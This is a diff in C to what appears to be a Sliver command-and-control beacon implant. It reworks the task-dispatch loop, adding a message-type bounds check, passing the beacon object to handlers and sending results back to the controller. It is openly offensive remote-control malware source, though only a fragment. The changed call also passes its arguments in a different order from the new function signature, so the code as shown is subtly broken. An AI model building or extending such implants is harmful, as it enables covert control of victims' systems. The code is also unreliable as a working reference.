@@ -263,32 +263,38 @@ CLEANUP:
 
 PENVELOPE* BeaconHandleTaskList
 (
+	_In_ PSLIVER_BEACON_CLIENT pBeacon,
 	_In_ PENVELOPE* Tasks,
 	_In_ DWORD dwNumberOfTasks
 )
 {
 	DWORD i = 0;
-	SYSTEM_HANDLER SystemTaskHandler;
-	LPVOID* HandlerList = NULL;
+	REQUEST_HANDLER ReqHandler = NULL;
+	REQUEST_HANDLER* HandlerTable = NULL;
 	PENVELOPE* pResult = NULL;
 
 	pResult = ALLOC(sizeof(PENVELOPE) * dwNumberOfTasks);
+	HandlerTable = GetSystemHandler();
+
 	for (i = 0; i < dwNumberOfTasks; i++) {
-		HandlerList = GetSystemHandler();
-		SystemTaskHandler = HandlerList[Tasks[i]->uType];
-		if (SystemTaskHandler != NULL) {
-			pResult[i] = SystemTaskHandler(Tasks[i]);
+		if (Tasks[i]->uType >= MsgEnd) {
+			goto UNKNOWN_TYPE;
+		}
+
+		ReqHandler = HandlerTable[Tasks[i]->uType];
+		if (ReqHandler != NULL) {
+			pResult[i] = ReqHandler(Tasks[i], pBeacon);
 			continue;
 		}
 
 		// Cac handler con lai
-
+UNKNOWN_TYPE:
 		pResult[i] = ALLOC(sizeof(ENVELOPE));
 		pResult[i]->uID = Tasks[i]->uID;
 		pResult[i]->uUnknownMessageType = 1;
 	}
 
-	FREE(HandlerList);
+	FREE(HandlerTable);
 
 	return pResult;
 }
@@ -343,12 +349,12 @@ VOID BeaconWork
 	DWORD i = 0;
 	DWORD dwOldInterval = 0;
 
-	TaskResults = BeaconHandleTaskList(pWrapper->pTaskList, pWrapper->dwNumberOfTasks);
+	pBeacon = pWrapper->pBeacon;
+	TaskResults = BeaconHandleTaskList(pWrapper->pTaskList, pWrapper->dwNumberOfTasks, pBeacon);
 	if (TaskResults == NULL) {
 		goto CLEANUP;
 	}
 
-	pBeacon = pWrapper->pBeacon;
 	dwOldInterval = pBeacon->dwInterval;
 	pSendEnvelope = MarshalBeaconTasks(pBeacon, 0, TaskResults, pWrapper->dwNumberOfTasks);
 	if (!pBeacon->Send(pBeacon->pGlobalConfig, pBeacon->lpClient, pSendEnvelope)) {
